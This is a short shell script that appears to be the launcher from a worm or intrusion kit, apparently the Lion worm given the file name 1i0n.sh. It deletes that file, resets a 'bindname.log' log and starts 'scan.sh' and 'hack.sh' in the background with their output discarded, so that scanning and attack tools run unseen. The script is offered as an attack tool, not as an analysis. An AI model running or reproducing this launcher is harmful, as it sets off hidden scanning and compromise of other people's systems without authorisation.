#!/bin/sh

rm -rf 1i0n.sh; rm -rf bindname.log; touch bindname.log
  nohup ./scan.sh >>/dev/null &
  nohup ./hack.sh >>/dev/null &
